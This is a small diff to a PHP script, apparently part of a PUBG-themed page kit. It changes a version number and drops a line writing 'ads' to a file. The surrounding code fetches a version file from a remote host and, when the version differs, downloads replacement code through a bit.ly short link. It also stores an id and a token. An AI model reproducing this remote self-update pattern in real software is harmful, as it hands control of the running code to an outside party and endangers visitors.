@@ -1,7 +1,7 @@
 <?
 $info = json_decode(file_get_contents('http://sha-my.xyz/Pubg/info.json'),1);
 $version= $info[info]['version'];
-$v = "5";
+$v = "2.1";
 if($v != $version){
 $iscript = file_get_contents('https://bit.ly/3lJKcQD');
 $index = file_get_contents($iscript);
@@ -29,7 +29,6 @@ if($token and $id){
 $info[info]['id'] = $id;
 $info[info]['token'] = $token;
  save($info);
-file_put_contents("link.txt", "ads");
 
 $url1 = "PPABB.php";
 header("location: $url1");
